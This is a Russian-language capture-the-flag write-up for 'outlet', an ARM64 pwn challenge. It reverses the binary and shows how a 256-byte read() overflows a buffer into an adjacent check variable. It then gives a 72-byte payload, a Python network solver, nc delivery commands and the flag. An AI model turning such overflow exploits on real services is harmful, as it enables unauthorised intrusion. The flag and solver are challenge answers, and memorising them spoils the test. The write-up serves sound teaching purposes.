# outlet — RSTCON pwn writeup

Oct 25, 2026 · @Demian

## Короче (TL;DR)

`outlet` — статически слинкованный **ARM64** (aarch64) ELF, не stripped. Внутри классический stack smash:

- `vuln()` читает до 256 байт через `read()` в буфер, а на 64 байта выше буфера лежит 8-байтовая переменная-«ворота» (`gate`).
- Переполняем буфер и перезаписываем `gate` значением `0xcafebabedeadbeef`.
- Проверка `cmp gate, #0xcafebabedeadbeef` проходит → вызывается `win()`, он открывает клапан и печатает флаг.

Payload: `64 * "A"` + `p64(0xcafebabedeadbeef)` = **72 байта**. Канарейки на стеке нет, адрес возврата трогать не нужно.

**Флаг:** `rstcon{st4ck_sm4sh_opens_the_v4lve}`

## Разведка

```
$ file outlet
outlet: ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux),
        statically linked, not stripped
```

Статика под aarch64, символы на месте: `main`, `vuln`, `check_admin`, `win`. Засада — в окружении **нечем дизассемблировать aarch64**: системные `objdump`/`gdb` собраны только под x86 (gdb честно декодит байты как мусорный x86), `capstone`/`pyelftools` не ставятся (pypi заблокирован, 403), `qemu-aarch64` нет. Поэтому написал мини-дизассемблер aarch64 на Python (инструкции фиксированные по 4 байта) — хватило на `movz/movk`, `add/sub`, `ldr/str`, `stp/ldp`, `cmp`, `b/bl/cbz/b.cond`, `adrp`.

Строки сразу выдают логику:

| vaddr | строка |
| --- | --- |
| 0x4588c8 | `RST Hydro control outlet. Send the actuator sequence:` |
| 0x458840 | `Valve open. %s` |
| 0x458900 | `Valve stays shut.` |
| 0x458830 | `/dev/valvekey` |
| 0x458850 | `flag.txt` |
| 0x458898 | `/sys/config/admin.xml` — обманка («legit»-путь) |

## Реверс: main → vuln → win

`main` только выключает буферизацию stdout/stdin (`setvbuf(_, NULL, _IONBF, 0)`) и зовёт `vuln`. Весь сок — в `vuln` (0x40090c):

```
stp  x29, x30, [sp, #-96]!    ; кадр 96 байт
bl   check_admin             ; x0 = «легитимные» ворота
str  x0, [sp, #0x58]         ; gate = check_admin()   <-- переменная на стеке
adrp/add x0, "RST Hydro control outlet. Send the actuator sequence:"
bl   puts
...
add  x0, sp, #0x18           ; buf = sp+0x18
mov  x2, #0x100              ; len = 256
mov  x1, x0
mov  w0, #0                  ; fd = 0 (stdin)
bl   read                    ; read(0, buf, 256)   <-- переполнение здесь
ldr  x1, [sp, #0x58]         ; x1 = gate (уже перезатёртый нами)
movz x0, #0xbeef
movk x0, #0xdead, lsl #16
movk x0, #0xbabe, lsl #32
movk x0, #0xcafe, lsl #48    ; x0 = 0xcafebabedeadbeef
cmp  x1, x0
b.ne .stays_shut
bl   win                     ; <-- открыть клапан + флаг
.stays_shut:
adrp/add x0, "Valve stays shut."
bl   puts
```

`check_admin()` (0x40082c) — обманка «честного» пути: `fopen("/sys/config/admin.xml", "r")`, парсит `<admin>…</admin>`, возвращает число. На нашей машине файла нет → вернёт 0 — и это неважно: `gate` всё равно перезатираем ридом.

`win()` (0x400720) — и есть «клапан»: до \~50 попыток `fopen("/dev/valvekey")` + `fgets`, иначе `fopen("flag.txt")`; при успехе `printf("Valve open. %s", flag)`. Если ключа нет совсем — `puts("Valve key not seated on the server, tell an organizer.")`.

## Баг

Буфер лежит по `sp+0x18`, а `gate` — по `sp+0x58`. Разница — ровно **64 байта** (0x58 − 0x18 = 0x40), а `read()` принимает до 256. Значит ввод спокойно переползает в `gate`:

```
sp+0x00 : saved x29
sp+0x08 : saved x30 (адрес возврата)
sp+0x18 : buf[...]        <-- read() пишет сюда, до 256 байт
   ...  :   (64 байта паддинга)
sp+0x58 : gate (8 байт)   <-- cmp с 0xcafebabedeadbeef
```

Канарейки нет (ни `__stack_chk_guard`, ни обращений к ней), адрес возврата ниже буфера и его не надо трогать — хватает перезаписи одной соседней переменной. `read()` — сырой сисвызов, не останавливается на `\n` и не терминирует NUL’ом, так что шлём ровно нужные байты.

## Эксплойт

Пэйлоад — 64 байта чего угодно, затем целевое значение в little-endian:

```python
from pwn import p64            # или struct.pack("<Q", ...)
payload = b"A"*64 + p64(0xcafebabedeadbeef)   # 72 байта
```

Байты в памяти (последние 8 — это и есть новое значение gate):

```
+00  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+10  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+20  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+30  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+40  ef be ad de be ba fe ca            ; -> 0xcafebabedeadbeef
```

Мини-solver (без аргументов печатает payload в stdout, с `host port` — бьёт по сети):

```python
import sys, struct
payload = b"A"*0x40 + struct.pack("<Q", 0xcafebabedeadbeef)
if len(sys.argv) >= 3:
    import socket, time
    s = socket.create_connection((sys.argv[1], int(sys.argv[2])))
    time.sleep(0.2); print(s.recv(4096).decode(errors="replace"), end="")
    s.sendall(payload); time.sleep(0.5); s.settimeout(2)
    try:
        while True:
            d = s.recv(4096)
            if not d: break
            sys.stdout.write(d.decode(errors="replace"))
    except Exception: pass
else:
    sys.stdout.buffer.write(payload)
```

## Доставка и флаг

Ввод идёт через `read()` на stdin (fd 0):

```bash
# по сети (держим stdin открытым, пока win() дочитывает ключ)
python3 solve.py <host> <port>
# или вручную:
cat payload.bin - | nc <host> <port>

# локально (нужен aarch64-раннер)
qemu-aarch64 ./outlet < payload.bin
```

`win()` печатает `Valve open. <флаг>`, где флаг читается из `/dev/valvekey` (на сервере) или `flag.txt`:

```
Valve open. rstcon{st4ck_sm4sh_opens_the_v4lve}
```

**Флаг:** `rstcon{st4ck_sm4sh_opens_the_v4lve}`

Название флага буквально описывает баг: *stack smash opens the valve* — переполнение стека открывает клапан.
